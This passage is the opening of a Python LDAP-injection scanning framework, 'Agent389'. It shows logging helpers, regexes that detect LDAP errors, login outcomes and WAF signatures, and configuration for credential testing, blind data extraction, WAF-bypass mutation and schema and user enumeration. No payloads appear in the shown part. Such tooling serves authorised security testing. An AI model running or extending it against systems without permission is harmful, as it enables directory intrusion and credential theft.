#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║             Agent389 v12.0 — Tactical LDAP Injection Framework                ║
║           Lead Architect: Abinav3ac | Professional Security Suite             ║
║           Focus: Find -> Verify -> Report -> Hand off to Exploiter            ║
╚══════════════════════════════════════════════════════════════════════════════╝
Architecture:
  ControlPlane — Tactical Intelligence layer governing all phases
  Phase 0 — Pre-flight (WAF Probe + Port Scan → wires to injection strategy)
  Phase 1 — Target Intelligence (Stack + Auth + Schema + GraphQL/OpenAPI)
  Phase 2 — Endpoint Discovery (Crawling + WS + Recursive Params + API)
  Phase 3 — Risk Analysis (Behavioral Probe + Statistical Anomaly + Function Map)
  Phase 4 — Vulnerability Audit (Injection + Chained Mutation + Verification)
  Phase 5 — Result Summary (Confidence + Impact + Cross-Correlation + Handoff)
Output:
  agent389_findings.json   — Primary handoff document for tactical analysis
  agent389_audit.ndjson    — Full audit trail of every signal and decision
!! Authorised security testing only !!
"""

from __future__ import annotations

# ═══════════════════════════════════════════════════════════════════════════════
# §1  STDLIB IMPORTS
# ═══════════════════════════════════════════════════════════════════════════════
import argparse
import hashlib
import ipaddress
import json
import math
import os
import random
import re
import socket
import statistics
import string
import struct
import sys
import threading
import time
import traceback
import uuid
import warnings
import ssl as _ssl
import struct as _struct
import copy
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from enum import Enum
from typing import (
    Any, Dict, List, Optional, Set, Tuple, Union
)
from urllib.parse import (
    parse_qs, quote, urljoin, urlparse, urlunparse, urlencode
)

# ── Third-party (graceful degradation) ──────────────────────────────────────
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings()
    _REQUESTS_OK = True
except ImportError:
    print("[FATAL] 'requests' library required: pip install requests")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
    _BS4_OK = True
except ImportError:
    _BS4_OK = False

try:
    import dnslib
    import dnslib.server
    _DNSLIB_OK = True
except ImportError:
    _DNSLIB_OK = False

warnings.filterwarnings("ignore")


# ═══════════════════════════════════════════════════════════════════════════════
# §2  VERSION & METADATA
# ═══════════════════════════════════════════════════════════════════════════════

VERSION    = "12.0.0"
BUILD_DATE = "2026-05"
TOOL_NAME  = "Agent389"

BANNER = r"""
   _____                         __ ________    ______  ________ 
  /  _  \    ____   ____   _____/  |\_____  \  /  __  \/   __   \
 /  /_\  \  / ___\_/ __ \ /    \   __\_(__  <  >      <\____    /
/    |    \/ /_/  >  ___/|   |  \  | /       \/   --   \  /    / 
\____|__  /\___  / \___  >___|  /__|/______  /\______  / /____/  
        \//_____/      \/     \/           \/        \/          

    [ Tactical LDAP Injection Framework | Agent: 389 ]
    [ Architect: Abinav3ac | project-hellhound-org ]
"""


# ═══════════════════════════════════════════════════════════════════════════════
# §3  CONSOLE LAYER
# ═══════════════════════════════════════════════════════════════════════════════

_VERBOSE: bool = False
_QUIET:   bool = False
_lock     = threading.Lock()

# ─────────────────────────────────────────────────────────────────────────────
# ANSI COLORS
# ─────────────────────────────────────────────────────────────────────────────
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; WHITE = "\033[37m"
    BRED = "\033[91m"; BGREEN = "\033[92m"; BYELLOW = "\033[93m"
    BBLUE = "\033[94m"; BMAGENTA = "\033[95m"; BCYAN = "\033[96m"; BWHITE = "\033[97m"

def color(text, *styles):
    return "".join(styles) + str(text) + C.RESET

def label(tag, text, tc=C.BBLUE):
    return f"{color('[',C.DIM)}{color(tag,tc,C.BOLD)}{color(']',C.DIM)} {text}"

def ok(t):       tprint(label("+",        t, C.BGREEN))
def warn(t):     tprint(label("!",        t, C.BYELLOW))
def err(t):      tprint(label("-",        t, C.BRED))
def info(t):     tprint(label("*",        t, C.BCYAN))
def success(t):  tprint(label("+",        t, C.BGREEN))
def found(t):    tprint(label("FOUND",    t, C.BCYAN))
def js_ep(t):    tprint(label("JS",       t, C.BMAGENTA))
def phase_print(t): tprint(label("PHASE",    t, C.BMAGENTA))

def tprint(*a, **kw):
    with _lock:
        print(*a, **kw)

def vprint(msg):
    if _VERBOSE:
        tprint(f"  {color('[v]', C.DIM)} {color(msg, C.DIM)}")

def vdim(msg):
    if _VERBOSE:
        tprint(color(f"    ↳ {msg}", C.DIM))

def section(title):
    bar = color("─" * 72, C.DIM + C.CYAN)
    tprint(f"\n{bar}")
    tprint(f"  {color('  ' + title + '  ', C.BOLD + C.BCYAN)}")
    tprint(f"{bar}")

def progress(cur, tot, w=28):
    pct = cur / tot if tot else 0
    filled = int(pct * w)
    b = color("█" * filled, C.BCYAN) + color("░" * (w - filled), C.DIM)
    return f"[{b}] {color(f'{int(pct*100):3d}%', C.BWHITE)} {color(f'{cur}/{tot}', C.DIM)}"

# ─── Enterprise Phase Banner ─────────────────────────────────────────────────
_PHASE_COLORS = {
    0: C.BBLUE,    # Pre-flight
    1: C.BCYAN,    # Intelligence
    2: C.BMAGENTA, # Discovery
    3: C.BYELLOW,  # Risk Analysis
    4: C.BRED,     # Injection
    5: C.BGREEN,   # Results
}
_PHASE_ICONS = {0:"⚙", 1:"🔍", 2:"🕸", 3:"⚠", 4:"💉", 5:"📊"}

def phase_header(number: int, name: str) -> None:
    """Enterprise-grade bordered phase banner with color and icon."""
    W = 78
    col = _PHASE_COLORS.get(number, C.BCYAN)
    icon = _PHASE_ICONS.get(number, "▶")
    inner = f"  {icon}  PHASE {number} — {name.upper()}  {icon}  "
    pad = max(0, W - 2 - len(inner))
    lp = pad // 2
    rp = pad - lp
    tprint(f"\n{col}╔{'═'*(W-2)}╗{C.RESET}")
    tprint(f"{col}║{' '*lp}{C.BOLD}{inner}{C.RESET}{col}{' '*rp}║{C.RESET}")
    tprint(f"{col}╚{'═'*(W-2)}╝{C.RESET}")

def phase_summary_box(title: str, rows: list, col: str = C.CYAN, width: int = 70) -> None:
    """Renders a labeled bordered box with key:value rows."""
    tprint(f"\n{col}┌{'─'*(width-2)}┐{C.RESET}")
    tprint(f"{col}│{C.RESET} {C.BOLD}{title.center(width-4)}{C.RESET} {col}│{C.RESET}")
    tprint(f"{col}├{'─'*(width-2)}┤{C.RESET}")
    for k, v in rows:
        line = f" {str(k).ljust(28)} │ {str(v)}"
        # strip ansi for length calc
        raw_line = re.sub(r'\x1b\[[0-9;]*m', '', line)
        pad = max(0, width - 3 - len(raw_line))
        tprint(f"{col}│{C.RESET}{line}{' '*pad} {col}│{C.RESET}")
    tprint(f"{col}└{'─'*(width-2)}┘{C.RESET}")

# Additional LDAP-specific markers (compatible with existing code)
def probe(msg: str)   -> None: 
    if _VERBOSE: tprint(label("PROBE", msg, "\x1b[35m"), file=sys.stderr)
def finding(msg: str) -> None: tprint(label("⚑ FOUND", msg, C.BRED))
def verbose(msg: str) -> None: 
    if _VERBOSE: tprint(label("VERBOSE", msg, C.DIM), file=sys.stderr)
def phase(msg: str)   -> None: tprint(label("PHASE", msg, C.BMAGENTA))
def detect_msg(m: str)-> None:
    if _VERBOSE: tprint(label("DETECT", m, C.BMAGENTA), file=sys.stderr)
def budget_msg(m: str)-> None:
    if _VERBOSE: tprint(label("BUDGET", m, C.BYELLOW), file=sys.stderr)
def bind_msg(m: str)  -> None:
    if _VERBOSE: tprint(label("BIND", m, C.BCYAN), file=sys.stderr)
def verify_msg_h(m: str)-> None: tprint(label("VERIFY", m, C.BYELLOW))

# ─────────────────────────────────────────────────────────────────────────────
# PARAMETER RISK SCORER — V7: LDAP-specific only (SQLi/cmdi keywords removed)
# ─────────────────────────────────────────────────────────────────────────────
_HIGH_RISK_RE = re.compile(
    r"user|uid|login|account|principal|sAMAccountName|"
    r"search|query|filter|ldap|dn|cn|ou|dc|"
    r"directory|member|group|role|credential",
    re.I
)
_MED_RISK_RE = re.compile(
    r"name|email|mail|id|value|text|data|param|"
    r"username|password|pass|pwd|token|session",
    re.I
)

def risk_score(name: str) -> int:
    if _HIGH_RISK_RE.search(name): return 2
    if _MED_RISK_RE.search(name):  return 1
    return 0

def prioritize_endpoints(eps: List[Endpoint]) -> List[Endpoint]:
    """Sort endpoints by risk score for UI presentation."""
    def score_ep(e: Endpoint) -> float:
        s = 0.0
        for p in e.params:
            rs = risk_score(p)
            if rs == 2: s += 10.0
            if rs == 1: s += 2.0
        if e.is_auth_ep: s += 5.0
        if e.method == "POST": s += 3.0
        return s
    return sorted(eps, key=score_ep, reverse=True)



def print_finding_card(f: "HandoffFinding", idx: int = 0) -> None:
    """CMDinj-style per-finding inline card — mirrors print_report() findings block."""
    sev_map = {
        "CRITICAL": C.BRED,
        "HIGH":     C.BYELLOW,
        "MEDIUM":   C.BCYAN,
        "LOW":      C.DIM,
    }
    sev_col = sev_map.get(f.severity, C.BCYAN)

    inj_label = f.payload_technique
    if f.verification_grade == "CONFIRMED":
        inj_label += " [CONFIRMED]"
    elif f.verification_grade == "PROBABLE":
        inj_label += " [PROBABLE]"
    if getattr(f, "oob_triggered", False):
        inj_label += " [OOB]"

    # Risk label from severity
    risk_label = color(f.severity, sev_col, C.BOLD)

    num = color(f"#{idx}", C.BRED, C.BOLD) if idx else ""
    tprint(f"\n  {num}  {color(f.http_method, C.BYELLOW)}  {color(f.endpoint_url, C.BWHITE)}")
    tprint(f"  {color('  param    :', C.DIM)} {color(f.parameter_name, sev_col, C.BOLD)}  {risk_label}")
    tprint(f"  {color('  technique:', C.DIM)} {color(inj_label, C.BMAGENTA)}")
    tprint(f"  {color('  grade    :', C.DIM)} {color(f.verification_grade, C.BCYAN)}")
    conf = getattr(f, 'reproduction_confidence', 0)
    tprint(f"  {color('  confidence:', C.DIM)} {color(str(conf) + '%', C.BGREEN if conf >= 70 else C.BYELLOW)}")

    raw_pl  = f.payload_raw
    tprint(f"  {color('  payload  :', C.DIM)} {color(raw_pl[:120], C.BRED)}")

    if f.ldap_error_snippet:
        ev = f.ldap_error_snippet[:120]
        tprint(f"  {color('  evidence :', C.DIM)} {color(ev, C.BGREEN)}")

    impact = getattr(f, 'impact_scenario', '') or f.exploiter_context.get('impact', {}).get('scenario', '')
    if impact:
        tprint(f"  {color('  impact   :', C.DIM)} {color(impact[:110], C.BYELLOW)}")

    curl = f.curl_poc[:140]
    tprint(f"  {color('  curl     :', C.DIM)} {color(curl, C.BYELLOW)}")

    if f.auth_state == "auth":
        tprint(f"  {color('  auth     :', C.DIM)} {color('Authenticated session', C.BCYAN)}")


class StatusBoard:
    """Live stderr status board for scan progress."""
    def __init__(self, orchestrated: bool = True):
        self.active      = orchestrated
        self.endpoint    = "Idle"
        self.phase       = "Initialization"
        self.requests    = 0
        self.findings    = 0
        self.running     = False
        self._thread     = None

    def start(self):
        if not self.active or _VERBOSE: return
        self.running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False
        if self._thread: 
            self._thread.join(1.0)
            sys.stderr.write("\r\033[2K") # Clear line

    def _loop(self):
        start_time = time.time()
        while self.running:
            elapsed = int(time.time() - start_time)
            m, s = divmod(elapsed, 60)
            time_str = f"{m:02d}:{s:02d}"
            
            # Compact Hellhound-style status line
            status = (
                f"{color(time_str, C.DIM)} "
                f"{color('ph:', C.BCYAN)}{color(self.phase[:10], C.BWHITE):<10} "
                f"{color('target:', C.BCYAN)}{color(self.endpoint[:25], C.BWHITE):<25} "
                f"{color('req:', C.BCYAN)}{color(str(self.requests), C.BWHITE):<5} "
                f"{color('vuln:', C.BYELLOW)}{color(str(self.findings), C.BRED if self.findings else C.GREEN):<2}"
            )
            # Use ANSI cursor home + clear line to update in place on stderr
            sys.stderr.write(f"\r\033[2K{status}")
            sys.stderr.flush()
            time.sleep(0.4)



# ═══════════════════════════════════════════════════════════════════════════════
# §4  REGEX ARSENAL — Detection patterns only
# ═══════════════════════════════════════════════════════════════════════════════

# Primary LDAP error pattern — HIGH confidence (framework-specific, not generic)
LDAP_ERRORS_RE = re.compile(
    r"InvalidSearchFilterException|LDAPException|javax\.naming|"
    r"NamingException|com\.sun\.jndi|"
    r"PartialResultException|DirectoryException|"
    r"LdapReferralException|SchemaViolationException|"
    r"AttributeInUseException|NoSuchAttributeException|"
    r"InvalidAttributeIdentifierException|"
    r"LdapErr\s*,\s*DSID-[0-9A-F]+|DSID-[0-9A-F]{8}|"
    r"0000208D|00000525|80090308|8007052E|80070005|"
    r"ldap_bind|ldap_search|ldap_connect|ldap_read|ldap3\.|"
    r"python-ldap|ldapjs\.|ldaps?://[a-z0-9._-]+|"
    r"System\.DirectoryServices|DirectoryServicesCOMException|"
    r"Active\s+Directory.*error|net\.ldap|spring.?security.?ldap|"
    r"org\.springframework\.ldap|com\.unboundid\.ldap",
    re.I,
)

# LOW confidence LDAP error indicators — used for supplemental scoring only
LDAP_ERRORS_LOW_RE = re.compile(
    r"invalid\s+filter|filter\s+syntax|"
    r"bad\s+search\s+filter|bad\s+assertion|"
    r"sizelimit\s+exceeded|timelimit\s+exceeded|"
    r"unwilling\s+to\s+perform|no\s+such\s+object|"
    r"no\s+such\s+attribute|constraint\s+violation|"
    r"error\s+code\s*[=:]\s*(?:32|33|34|48|49|50|51|52|53|54|64|65|66|67|68|69|70|71|80)\b|"
    r"(?:result|error|ldap)\s*(?:code)?\s*[=:]\s*"
    r"(?:49|32|33|34|48|50|51|52|53|54|64|65|66|67|68|69|70|71|80)\b",
    re.I,
)

# Auth success indicators — HIGH confidence (explicit keywords)
AUTH_SUCCESS_HIGH_RE = re.compile(
    r"\b(logout|sign.out|authenticated|dashboard|admin.panel|control.panel|"
    r"authorized|session.active|access\s+granted|valid\s+(?:user|login|credentials?)|"
    r"user.menu|user.avatar|logout.btn|sign.out.link|account.menu|profile|"
    r"flag\{|HTB\{|ROOT\{)\b",
    re.I,
)

# Auth success indicators — LOW confidence (generic words)
AUTH_SUCCESS_LOW_RE = re.compile(
    r"\b(my.account|login\s+success|"
    r"you\s+are\s+(?:logged|connected|authenticated)\b|"
    r"vous\s+[êe]tes\s+connect|bienvenue|connexion\s+r.ussie|"
    r"bienvenido|acceso\s+concedido|willkommen|erfolgreich\s+angemeldet|"
    r"bem.vindo|acesso\s+permitido)\b",
    re.I,
)

# Auth failure indicators — multilingual
AUTH_FAIL_RE = re.compile(
    r"invalid[\s_]+credentials?|authentication[\s_]+fail|"
    r"login[\s_]+fail|incorrect[\s_]+password|bad[\s_]+credentials?|"
    r"access[\s_]+denied|unauthori[sz]ed|"
    r"mauvais[\s_]+(?:login|mot\s+de\s+passe|identifiant)|"
    r"identifiant[\s_]+invalide|connexion[\s_]+(?:échouée|refusée)|"
    r"mot[\s_]+de[\s_]+passe[\s_]+incorrect|"
    r"falsches[\s_]+passwort|benutzername[\s_]+falsch|"
    r"anmeldung[\s_]+fehlgeschlagen|"
    r"contraseña[\s_]+incorrecta|usuario[\s_]+no[\s_]+válido|"
    r"credenziali[\s_]+errate|senha[\s_]+incorreta|"
    r"wrong[\s_]+(?:password|username|credentials?)|"
    r"(?:user|account)[\s_]+not[\s_]+found|login[\s_]+incorrect",
    re.I,
)

# Lockout indicators — prevents false signals during verification
_LOCKOUT_RE = re.compile(
    r"account\s+locked|too\s+many\s+attempts|locked\s+out|"
    r"temporary\s+block|retry\s+later|suspicious\s+activity|"
    r"blocked\s+due\s+to\s+security",
    re.I,
)

# HTML class-based auth failure (language-agnostic)
AUTH_FAIL_HTML_RE = re.compile(
    r'class=["\'][^"\']*(?:error|alert[\s_-]*danger|login[\s_-]*error|'
    r'auth[\s_-]*error|invalid[\s_-]*credential|form[\s_-]*error|'
    r'message[\s_-]*error|alert[\s_-]*red|flash[\s_-]*error)[^"\']*["\']|'
    r'id=["\'][^"\']*(?:error[\s_-]*message|login[\s_-]*error|'
    r'auth[\s_-]*fail|invalid[\s_-]*msg)[^"\']*["\']',
    re.I,
)

# LDAP filter reflection in response (v3.0 expanded)
LDAP_FILTER_REFLECT_RE = re.compile(
    r"\(&\s*\([a-zA-Z]+=|\(objectClass=\w+\)|\(\|\s*\(uid=|"
    r"\(\|\s*\(cn=|filter\s+(?:used|applied|executed)\s*[:\-]?\s*[\(\[]|"
    r"Bad\s+filter\s*:\s*[\(\[]|filter\s+error.*[\(\[]|"
    r"^\s*\(&|^\s*\(\||"
    r"(?:search|query)\s+filter\s*[=:]\s*[\(\[]",
    re.I | re.M,
)

# Protected path patterns (for redirect detection)
PROTECTED_PATH_RE = re.compile(
    r"/(dashboard|admin|panel|portal|home|account|profile|"
    r"management|settings|overview|control|users|directory|protected)",
    re.I,
)

# Dynamic token pattern (for normalized hashing)
DYNAMIC_TOKEN_RE = re.compile(
    r"(?:csrf|nonce|token|_token|requestId|viewstate|__viewstate|"
    r"authenticity_token|_csrf)\s*[:=]\s*[\"']?[a-zA-Z0-9+/=_\-]{8,}[\"']?|"
    r"\b\d{10,13}\b|"
    r"[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}|"
    r'"_csrf"\s*:\s*"[a-zA-Z0-9\-_]{10,}"',
    re.I,
)

# Static file extensions (skip in crawler)
STATIC_EXT_RE = re.compile(
    r'\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|'
    r'map|pdf|zip|gz|mp4|mp3|avi|mov)$',
    re.I,
)

# Auth endpoint path patterns
AUTH_EP_RE = re.compile(
    r"/login|/signin|/auth|/sso|/bind|/token|/session|/oidc|/saml|/cas",
    re.I,
)

# LDAP metacharacter set
LDAP_METACHAR_SET = ["*", "(", ")", "|", "&", "\\", "\x00", "%00"]

# JS endpoint extraction patterns
JS_FETCH_RE    = re.compile(
    r"""(?:fetch|axios\.(?:get|post|put|delete|patch))\s*"""
    r"""\(\s*[`'"](\/[^`'"?#\s]{1,200})[`'"]""",
    re.I,
)
JS_API_PATH_RE = re.compile(
    r"""[`'"](\/api\/[v\d]*\/?[a-zA-Z0-9_\-\/]{1,100})[`'"]"""
)

# WAF signature patterns
WAF_SIGS: List[Tuple[str, re.Pattern]] = [
    ("Cloudflare",  re.compile(r"cloudflare|cf-ray",                   re.I)),
    ("Akamai",      re.compile(r"akamai|reference\s+#\d",              re.I)),
    ("Imperva",     re.compile(r"incapsula|imperva",                   re.I)),
    ("ModSecurity", re.compile(r"mod_security|modsecurity",            re.I)),
    ("AWS_WAF",     re.compile(r"aws-waf",                             re.I)),
    ("F5_BIGIP",    re.compile(r"bigip|tmui",                          re.I)),
    ("Generic",     re.compile(r"blocked.*request|security.?error|"
                               r"attack\s+detected",                   re.I)),
]


# ═══════════════════════════════════════════════════════════════════════════════
# §5  ENUMERATIONS
# ═══════════════════════════════════════════════════════════════════════════════

class Severity(Enum):
    CRITICAL = 4
    HIGH     = 3
    MEDIUM   = 2
    LOW      = 1
    INFO     = 0


class VerificationGrade(Enum):
    CONFIRMED = "CONFIRMED"   # All 3 verification steps passed
    PROBABLE  = "PROBABLE"    # Steps 1+3 passed, step 2 inconclusive
    CANDIDATE = "CANDIDATE"   # Step 1 passed, replay inconsistent
    REJECTED  = "REJECTED"    # FP filtered or step 1 failed


class ResponseClass(Enum):
    AUTH_SUCCESS = "AUTH_SUCCESS"
    AUTH_FAIL    = "AUTH_FAIL"
    ERROR        = "ERROR"
    REDIRECT     = "REDIRECT"
    STATIC       = "STATIC"


def classify_response(resp: requests.Response, baseline: Baseline) -> str:
    """Wave 3: Categorize response with redirect history awareness (§7.1)."""
    if resp is None: return ResponseClass.STATIC.value
    
    # 1. Direct Redirects
    if resp.status_code in (301, 302, 303, 307, 308):
        return ResponseClass.REDIRECT.value
        
    # 2. History-based Redirects (Chains)
    if resp.history:
        for r in resp.history:
            if r.status_code in (301, 302, 303, 307, 308):
                # If we landed on a dashboard after a redirect, it's a success-redirect
                if PROTECTED_PATH_RE.search(urlparse(resp.url).path):
                    return ResponseClass.REDIRECT.value
                
    # 3. LDAP Errors
    body = resp.text or ""
    if LDAP_ERRORS_RE.search(body):
        return ResponseClass.ERROR.value
        
    # 4. Auth State (multilingual)
    if AUTH_SUCCESS_HIGH_RE.search(body):
        return ResponseClass.AUTH_SUCCESS.value
    if AUTH_FAIL_RE.search(body) or AUTH_FAIL_HTML_RE.search(body):
        return ResponseClass.AUTH_FAIL.value
    
    if AUTH_SUCCESS_LOW_RE.search(body):
        return ResponseClass.AUTH_SUCCESS.value

    return ResponseClass.STATIC.value


class VolatilityClass(Enum):
    """
    Classifies baseline response stability.
    Drives all diff thresholds throughout the detection pipeline.
    """
    STATIC         = "STATIC"          # CV < 0.05  — stable pages
    UNSTABLE       = "UNSTABLE"        # CV 0.05–0.25 — some dynamic content
    HIGHLY_DYNAMIC = "HIGHLY_DYNAMIC"  # CV > 0.25  — heavy dynamic content


class AuthState(Enum):
    UNAUTH = "unauth"
    AUTH   = "auth"
    BOTH   = "both"


class LDAPServerType(Enum):
    AD       = "ad"
    OPENLDAP = "openldap"
    DS389    = "389ds"
    NOVELL   = "novell"
    ORACLE   = "oracle"
    GENERIC  = "generic"


@dataclass
class ServerTypeProfile:
    """Wave 3: Weighted evidence profile for server type determination (§3.4)."""
    scores: Dict[str, int] = field(default_factory=lambda: {
        "ad": 0, "openldap": 0, "389ds": 0, "novell": 0, "oracle": 0
    })
    
    def add(self, server: str, weight: int):
        if server in self.scores:
            self.scores[server] += weight
            
    def best(self) -> str:
        top = max(self.scores, key=self.scores.get)
        return top if self.scores[top] > 0 else "generic"


class BudgetMode(Enum):
    """
    Adaptive budget allocation modes.
    Selected automatically based on target profile.
    """
    MINIMAL    = "A"  # < 8 endpoints, no LDAP signals — 300 requests
    STANDARD   = "B"  # Default — 800 requests
    HIGH_VALUE = "C"  # LDAP signals found or LDAP ports open — 1500 requests


class PayloadTier(Enum):
    TIER0_PROBE    = 0   # 3 payloads — always runs, free budget
    TIER1_CORE     = 1   # 8 payloads — runs when Tier 0 signals
    TIER2_BOOLEAN  = 2   # 6 payloads — blind oracle confirmation
    TIER3_WAF      = 3   # Dynamic — generated from successful T1 payload
    TIER4_OOB      = 4   # 3 payloads — only when collab host configured
    TIER5_MUTATION = 5   # Obfuscated/mutated bypass payloads
    TIER6_SECOND_ORDER = 6 # Probes reflected after initial injection


# ═══════════════════════════════════════════════════════════════════════════════
# §6  CORE DATA MODELS
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class ScanConfig:
    """
    Complete scan configuration.
    Single source of truth — passed to every component.
    """
    # Target
    target:              str
    scan_id:             str            = field(
        default_factory=lambda: uuid.uuid4().hex[:12])
    deterministic_suffix: str           = field(
        default_factory=lambda: uuid.uuid4().hex[:8])

    # Authentication
    auth_url:            Optional[str]  = None
    auth_data:           Dict[str, str] = field(default_factory=dict)
    cookies:             Dict[str, str] = field(default_factory=dict)
    extra_headers:       Dict[str, str] = field(default_factory=dict)

    # Network
    proxy:               Optional[str]  = None
    verify_ssl:          bool           = False
    timeout:             int            = 12
    rps:                 float          = 4.0
    threads:             int            = 4
    depth:               int            = 4
    crawl_page_limit:    int            = 200  # ← ENHANCEMENT #2: Increased from hardcoded 60, configurable

    # Budget
    request_budget:      int            = 800
    budget_mode:         Optional[str]  = None  # None = auto-select

    # Detection
    min_ldap_prob:       int            = 10
    entropy_min:         float          = 0.05
    timing_z_min:        float          = 2.5
    max_payloads_tier1:  int            = 8
    second_order_delay:  float          = 1.0   # ← OE2: Reduced from 3s to 1s configurable
    server_type:         str            = "auto"
    calibrated_z_min:    Optional[float]= None  # ← C3.4: Set by NetworkJitterCalibrator
    extract:             bool           = False # ← C3.5: Gate extraction behind flag
    extract_limit:       int            = 32   # ← ENHANCEMENT #3: Configurable char cap for extraction
    replay_count:        int            = 5    # ← ENHANCEMENT #6: Configurable replays for statistical rigor
    no_extract:          bool           = False # ← ENHANCEMENT #3: Safety flag to disable extraction entirely

    # Features
    collab:              Optional[str]  = None
    oob_port:            int            = 53
    force_scan:          bool           = False
    safe_mode:           bool           = False  # credential testing always runs
    js_crawl:            bool           = True
    apispec_harvest:     bool           = True
    sitemap_harvest:     bool           = True
    headless:            bool           = False # ← ENHANCEMENT #2: Headless browser for SPA discovery
    cred_file:           Optional[str]  = None  # ← ENHANCEMENT #1: Configurable credential wordlist

    # Output
    output_dir:          str            = "."
    findings_file:       str            = "agent389_findings_{scan_id}.json"
    audit_file:          str            = "agent389_audit.ndjson"
    checkpoint_file:     str            = "checkpoint.json"
    verbose:             bool           = False
    quiet:               bool           = False
    min_confidence:      int            = 0    # drop findings below this
    resume:              bool           = False # resume from checkpoint

    # External Data
    endpoints_file:      Optional[str]  = None

    # Scoring
    behavioral_sensitivity: float       = 1.0

    # V6: Timing Side-Channel
    timing_extract:         bool        = False  # enable timing-based blind extraction
    timing_sleep_ms:        int         = 2000   # sleep injection duration (ms)
    timing_samples:         int         = 5      # samples per timing probe

    # V6: Stateful Exploitation
    stateful_mode:          bool        = False  # enable stateful attack chaining
    state_delay:            float       = 2.0    # delay between inject and probe

    # V6: Polymorphic WAF Bypass
    polymorphic_waf:        bool        = True   # enable polymorphic bypass generation
    poly_depth:             int         = 3      # mutation chain depth

    # V6: Context-Aware Payloads
    context_aware:          bool        = True   # enable target-aware payload building
    schema_probe_enabled:   bool        = True   # per-endpoint schema discovery (DirectorySchemaProbe)
    schema_discovery:       bool        = True   # discover schema before payload gen

    # V6: Schema Enumeration
    enumerate_schema:       bool        = False  # run post-confirm schema enum phase
    enum_max_users:         int         = 50     # cap user enumeration results
    enum_attrs:             List[str]   = field(default_factory=list)


@dataclass
class Endpoint:
    """
    A single scannable endpoint.
    Cloned into unauth and auth variants during discovery.
    """
    url:             str
    method:          str
    params:          List[str]
    source:          str                    # form|js|apispec|sitemap|fallback
    auth_state:      AuthState              = AuthState.UNAUTH
    is_auth_ep:      bool                   = False
    ldap_prob:       int                    = 0
    priority:        float                  = 0.0
    use_json:        bool                   = False
    csrf_data:       Dict[str, str]         = field(default_factory=dict)
    default_params:  Dict[str, str]         = field(default_factory=dict)
    context_type:    str                    = "generic"
    framework:       Optional[str]          = None
    discovered_via:  str                    = ""
    array_params:    List[str]              = field(default_factory=list)  # ← G1: Array-style params (param[], param[0], etc.)

    @property
    def key(self) -> str:
        p = urlparse(self.url)
        state = self.auth_state.value
        return (f"{self.method.upper()}:"
                f"{p.netloc.lower()}"
                f"{(p.path.rstrip('/') or '/').lower()}"
                f":{state}")


@dataclass
class Baseline:
    """
    Baseline response profile for a single endpoint+auth_state.
    Stores everything needed to calibrate detection thresholds.
    """
    status:            int
    body:              str
    body_len:          int
    body_hash:         str
    norm_body_hash:    str              # dynamic-token-stripped hash
    has_form:          bool
    final_url:         str
    cookies:           Set[str]
    response_class:    str              # ResponseClass value
    volatility:        VolatilityClass = VolatilityClass.STATIC
    samples:           List[float]     = field(default_factory=list)
    len_samples:       List[int]       = field(default_factory=list)
    len_variance:      float           = 0.0
    unstable:          bool            = False
    highly_dynamic:    bool            = False
    # Deterministic param values for replay consistency
    replay_params:     Dict[str, str]  = field(default_factory=dict)
    # Diff thresholds calibrated to this baseline's volatility — V7: set dynamically
    diff_threshold:    float           = 0.05
    bool_threshold:    float           = 0.08
    headers:           Dict[str, str]  = field(default_factory=dict) # ← C3.6: For HeaderAnomaly detection

    def set_volatility_thresholds(self) -> None:
        """V7: Calibrate diff_threshold and bool_threshold from actual volatility class."""
        if self.volatility == VolatilityClass.STATIC:
            self.diff_threshold = 0.03
            self.bool_threshold = 0.05
        elif self.volatility == VolatilityClass.UNSTABLE:
            self.diff_threshold = 0.08
            self.bool_threshold = 0.12
        else:  # HIGHLY_DYNAMIC
            self.diff_threshold = 0.15
            self.bool_threshold = 0.20

    @property
    def median_time(self) -> float:
        s = self._iqr_samples()
        return statistics.median(s) if s else 0.5

    @property
    def stddev(self) -> float:
        s = self._iqr_samples()
        if len(s) < 2:
            return max(self.median_time * 0.3, 0.3)
        if self.unstable:
            med = statistics.median(s)
            mad = statistics.median([abs(x - med) for x in s])
            return max(1.4826 * mad, 0.05)
        return statistics.stdev(s)

    def _iqr_samples(self) -> List[float]:
        s = sorted(self.samples)
        if len(s) < 4:
            return s
        q1, q3 = s[len(s) // 4], s[3 * len(s) // 4]
        iqr = q3 - q1
        return [x for x in s
                if (q1 - 1.5 * iqr) <= x <= (q3 + 1.5 * iqr)] or s

    def z_score(self, t: float) -> float:
        return (t - self.median_time) / max(self.stddev, 0.05)

    def is_timing_anomaly(self, t: float,
                           z_min: Optional[float] = None) -> bool:
        threshold = z_min or 3.0
        if self.unstable:
            threshold *= 1.5
        absolute_min = 0.4  # Must be at least 400ms above baseline median (v3.0)
        return (self.z_score(t) >= threshold
                and (t - self.median_time) >= absolute_min)


@dataclass
class Payload:
    raw:              str
    desc:             str
    technique:        str
    tier:             PayloadTier
    priority:         int  = 5
    context:          str  = "any"
    server:           str  = "any"
    cve_ref:          str  = ""
    waf_blocked_count:int  = 0  
    encoded_already:  bool = False   # Prevent double-URL encoding


@dataclass
class DetectionSignal:
    """
    A single fired detection signal from one detector.
    Aggregated across all detectors to produce finding score.
    """
    detector:  str
    score:     float
    indicator: str
    evidence:  str  = ""


@dataclass
class RawLDAPFinding:
    """
    Finding from direct LDAP protocol testing (Phase 3).
    These bypass the web injection pipeline entirely.
    Verification grade is always CONFIRMED.
    """
    host:         str
    port:         int
    finding_type: str   # ANONYMOUS_BIND|WEAK_CREDENTIALS|ROOTDSE_EXPOSED
    severity:     Severity
    evidence:     str
    bind_dn:      str   = ""
    bind_pw:      str   = ""
    server_type:  str   = "generic"
    rootdse_data: Dict[str, Any] = field(default_factory=dict)


@dataclass
class InconclusiveFinding:
